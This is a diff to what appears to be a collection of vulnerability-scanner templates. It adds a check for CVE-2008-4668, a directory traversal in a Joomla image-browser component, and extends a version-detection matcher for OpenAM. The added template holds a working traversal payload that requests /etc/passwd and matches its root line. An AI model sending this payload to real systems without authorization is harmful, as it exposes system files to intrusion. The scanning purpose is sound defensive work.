@@ -275,6 +275,40 @@
       ]
     },
     {
+      "id": "CVE-2008-4668",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the Image Browser (com_imagebrowser) 0.1.5 component for Joomla! allows remote attackers to include and execute arbitrary local files via a .. (dot dot) in the folder parameter to index.php.",
+        "name": "Joomla! Component imagebrowser 0.1.5 rc2 - Directory Traversal",
+        "reference": "- https://www.exploit-db.com/exploits/6618\n- https://www.cvedetails.com/cve/CVE-2008-4668\n",
+        "severity": "high",
+        "tags": "cve,cve2008,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_imagebrowser&folder=../../../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2008-4764",
       "info": {
         "author": "daffainfo",
@@ -22817,10 +22851,12 @@
               ]
             },
             {
+              "condition": "or",
               "part": "body",
               "type": "word",
               "words": [
-                "Version Information -"
+                "Version Information -",
+                "openam/ccversion/Masthead.jsp"
               ]
             }
           ],
